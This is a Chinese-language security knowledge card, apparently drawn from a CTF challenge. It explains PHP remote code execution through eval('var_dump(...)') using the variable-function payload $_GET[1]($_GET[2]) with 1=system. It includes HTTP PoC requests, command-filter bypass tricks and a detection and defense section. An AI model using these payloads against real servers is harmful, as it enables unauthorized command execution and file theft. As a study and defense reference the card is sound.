---
id: web-php-rce-eval-var-dump-superglobal-variable-function
title: eval(var_dump($input)) 注入：用 $_GET[1]($_GET[2]) 变量函数绕过关键词过滤执行命令
type: scenario
domain: web
path: web/php/rce
technique: eval-var-dump-superglobal-variable-function
aliases:
- eval var_dump 注入
- $_GET[1]($_GET[2])
- 变量函数绕过 WAF
- 超级全局变量当函数名
- PHP 动态函数调用
- safe_filter 绕过
tags:
- web
- php
- rce
- eval
- var-dump
- variable-function
- waf-bypass
- ctf
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V178
  verified_at: '2026-11-06T17:37:45+08:00'
  notes: 已对照原文论坛题源码与payload核对：eval("var_dump()")、cmd=[1]([2])&1=system&2=tac f*，变量函数在运行时解析system并绕过safe_filter字面量检查，原文称拿到flag；safe_filter实现未给出，属未验证点；无CVE、无sources/source_url；未复现。
---

## 一句话结论

当应用把用户输入放进 `eval("var_dump($input);")`，而过滤函数只按关键词/字面量拦截危险函数名时，可以提交 `cmd=$_GET[1]($_GET[2])`，并用 `1=system&2=tac f*` 提供函数名和参数；eval 内实际执行的是 `var_dump($_GET[1]($_GET[2]));`，`$_GET[1]` 在运行时解析为 `system`，从而绕过对 `system`/`cat` 等字面量的过滤并执行命令。

## 原理

- 目标代码形态：
  ```php
  $rce = @$_REQUEST['cmd'];
  $filter_result = safe_filter($rce);
  if (!$filter_result['status']) exit;
  $safe_rce = $filter_result['data'];
  eval("var_dump($safe_rce);");
  ```
- 用户输入不是直接 `eval($input)`，而是被嵌入 `var_dump(...)` 的表达式位置；只要输入能构成合法 PHP 表达式，就会被求值。
- PHP 支持“变量函数”：若变量 `$f` 的值是字符串 `system`，则 `$f('id')` 等价于 `system('id')`。`$_GET[1]` 就是一个可由请求参数控制的变量，值为 `system`；`$_GET[2]` 为命令字符串。
- 过滤器的盲区：它检查的是 `cmd` 参数的字面内容，看到的是 `$_GET[1]($_GET[2])`，其中没有 `system`、`cat`、`/` 等关键词；危险函数名和命令都藏在另外的 GET 参数里，运行时才拼接。
- `var_dump` 只是外层包装，不改变表达式求值；`$_GET[1]($_GET[2])` 的返回值会被 `var_dump` 输出，若命令有回显即可看到结果。
- 案例 payload：`?cmd=$_GET[1]($_GET[2])&1=system&2=tac f*`，其中 `tac` 反转读取文件、`f*` 通配匹配 flag；页面返回命令输出，拿到 flag。

## 触发条件

- 存在 `eval`/`assert`/`create_function` 等代码执行 sink，且用户输入被拼进表达式（不一定在字符串内）。
- 过滤是关键词/黑名单式，未禁止 `$`、`_GET`、`[`、`]`、`(`、`)` 等变量函数语法。
- PHP 未禁用变量函数/`system` 等函数（`disable_functions` 未覆盖），或可通过其它函数替代。
- 攻击者能控制至少两个请求参数：一个放函数名，一个放参数。

## 利用步骤

1. 找到 eval sink 与包装形式（`var_dump(...)`、`print(...)`、`if(...)` 等），确认输入被当作表达式还是字符串。
2. 探测过滤：提交 `cmd=1`、`cmd=$_GET[1]`、`cmd=$_GET[1]($_GET[2])` 等，观察是否被拦截或报错。
3. 选择可用函数：`system`、`passthru`、`shell_exec`、`exec`、`popen` 等；若被 `disable_functions` 禁用，尝试 `file_get_contents`/`scandir`/`highlight_file` 等读文件函数。
4. 构造请求：`cmd=$_GET[1]($_GET[2])&1=system&2=<command>`；对 `$`、`[`、`]` 做 URL 编码（`%24`、`%5B`、`%5D`）以绕过部分 WAF。
5. 命令过滤绕过：用 `tac`/`sort`/`rev` 替代 `cat`，用 `f*`/`?` 通配符替代文件名，用 `${IFS}`/Tab 替代空格。
6. 验证回显；若无回显，改用写文件/带外通道（DNS、HTTP）确认执行。

## PoC

```http
GET /forum.php?cmd=$_GET[1]($_GET[2])&1=system&2=tac%20f* HTTP/1.1
Host: target
```

等价于在 PHP 中执行：

```php
var_dump(system('tac f*'));
```

URL 编码版本：

```http
GET /forum.php?cmd=%24_GET%5B1%5D(%24_GET%5B2%5D)&1=system&2=tac%20f%2A
```

案例使用 `tac f*` 读取 flag；本卡不针对真实站点执行。

## 变体与关联

- 函数名可放在 `$_POST`/`$_COOKIE`/`$_REQUEST` 中；也可用 `${'_GET'}[1]`、`$GLOBALS['_GET'][1]` 等变体。
- 若 `$` 被过滤，可用 `get_defined_vars()`/`end()`/`current()` 取回参数；若 `(` 被过滤，需寻找其它表达式注入点。
- 若 `var_dump` 被替换为 `print`/`echo`/`if`，注入语法相应调整；核心是“输入进入表达式位置”。
- 关联：[[web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass]]（字符串拼接函数名绕过 WAF）、[[web-php-rce-no-param-get-defined-vars]]（无参 RCE 取回参数）、[[web-php-rce-webshell-end-get-last-param-eval]]（eval 取 GET 参数）。
- 边界：若过滤禁止 `$`/`[`/`]`/`(` 或使用 AST 白名单，变量函数注入会失败；若 `disable_functions` 禁用全部命令函数，需要改用文件读写/SSRF 等原语。

## 检测与防御

- 根本修复：不要对用户输入使用 `eval`/`assert`；必须动态求值时使用白名单表达式解析器，而不是 PHP eval。
- 输入校验：禁止 `$`、`[`、`]`、`(`、`)`、反引号等代码字符；使用 AST/语法白名单而非关键词黑名单。
- 运行时：`disable_functions` 覆盖命令执行函数，限制 Web 用户权限；开启 `open_basedir`；监控 `var_dump`/`eval` 相关异常。
- 检测：请求中出现 `$_GET[`、`$_POST[`、`$GLOBALS`、变量函数调用、URL 编码的 `%24_GET`；页面回显命令输出；日志中出现 `eval()'d code` 报错。
